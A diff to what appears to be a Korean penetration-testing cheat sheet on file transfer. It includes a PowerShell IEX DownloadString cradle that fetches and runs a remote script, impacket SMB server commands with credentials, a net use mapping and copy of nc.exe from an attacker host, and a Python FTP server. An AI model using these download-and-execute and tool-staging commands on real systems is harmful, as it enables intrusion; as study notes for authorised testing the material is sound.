@@ -28,9 +28,12 @@ IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/
 ```impacket-smbserver share -smb2support /tmp/smbshare```<br/>
 ```copy \\192.168.220.133\share\nc.exe```
 
-사용자 인증 추가 - 비인증 경고 우회) 
+사용자 인증 추가 - 비인증 경고 우회) <br/>
 ```impacket-smbserver share -smb2support /tmp/smbshare -user test -password test```<br/>
-```net use n: \\192.168.220.133\share /user:test test```
+```
+net use n: \\192.168.220.133\share /user:test test
+copy n:\nc.exe
+```
 
 ### FTP 서버 생성
 ```python3 -m pyftpdlib --port 21```<br/>
